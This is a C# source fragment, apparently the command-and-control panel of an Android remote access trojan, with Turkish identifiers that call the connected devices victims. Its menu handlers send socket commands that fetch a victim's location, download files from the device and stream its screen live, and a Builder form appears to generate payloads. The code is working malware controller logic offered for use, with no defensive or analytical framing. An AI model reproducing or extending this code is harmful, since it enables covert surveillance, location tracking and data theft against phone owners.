        private void oluşturToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Builder().Show();
        }

        private void hakkındaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Hakkinda().Show();
        }

        private void konumToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        KomutGonder("KONUM", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }

        private void ayarlarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Settings().Show();
        }

        private void dosyaİndirtToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        DownloadManager dwn = new DownloadManager(kurban.soket, kurban.id);
                        dwn.Text = "Download Manager - " + krbnIsminiBul(kurban.soket.Handle.ToString());
                        dwn.Show();
                    }
                }
            }
        }
        private void bağlantıAyarlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        new Baglanti(kurban.soket, kurban.id).Show();
                    }
                }
            }
        }

        private void loglarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            panel1.Visible = !panel1.Visible;
            if (panel1.Visible) { loglarToolStripMenuItem.Text = "Victims"; }
            else { loglarToolStripMenuItem.Text = "Logs"; }
        }
        public string krbnIsminiBul(string handle)
        {
            string isim = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == handle).First().SubItems[1].Text;
            string ip = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == handle).First().SubItems[2].Text;
            return isim + "@" + ip;
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Kurbanlar krbn in kurban_listesi.ToList())
            {
                try
                {
                    byte[] kntrl = Encoding.UTF8.GetBytes("[0x09]KNT[VERI][0x09]<EOF>");
                    krbn.soket.Send(kntrl, 0, kntrl.Length, SocketFlags.None);
                }
                catch (Exception)
                {
                    var victim = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == krbn.soket.Handle.ToString()).First();
                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbn.soket.Handle.ToString() + " connection of this socket has closed. => " + victim.SubItems[1].Text + "/" + victim.SubItems[2].Text);
                    victim.Remove();
                    kurban_listesi.Where(x => x.id == krbn.soket.Handle.ToString()).First().soket.Close();
                    kurban_listesi.Where(x => x.id == krbn.soket.Handle.ToString()).First().soket.Dispose();
                    kurban_listesi.Remove(kurban_listesi.Where(x => x.id == krbn.soket.Handle.ToString()).First());
                    toolStripStatusLabel2.Text = "Online: " + listView1.SelectedItems.Count.ToString();
                }
            }
        }

        private void liveScreenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                if (int.Parse(listView1.SelectedItems[0].SubItems[5].Text.Split('/')[1]) >= 21)
                {
                    foreach (Kurbanlar kurban in kurban_listesi)
                    {
                        if (kurban.id == listView1.SelectedItems[0].Text)
                        {
                            livescreen lvsc = new livescreen(kurban.soket, kurban.id);
                            lvsc.Text = "Live Screen - " + krbnIsminiBul(kurban.soket.Handle.ToString());
                            lvsc.Show();
                        }
                    }
                }
                else
                {
                    MessageBox.Show("Target device's API Level must be 21 or higher.\nCheck link\nhttps://developer.android.com/reference/android/media/projection/MediaProjection");
                    System.Diagnostics.Process.Start("https://developer.android.com/reference/android/media/projection/MediaProjection");
                }
            }
        }
    }
}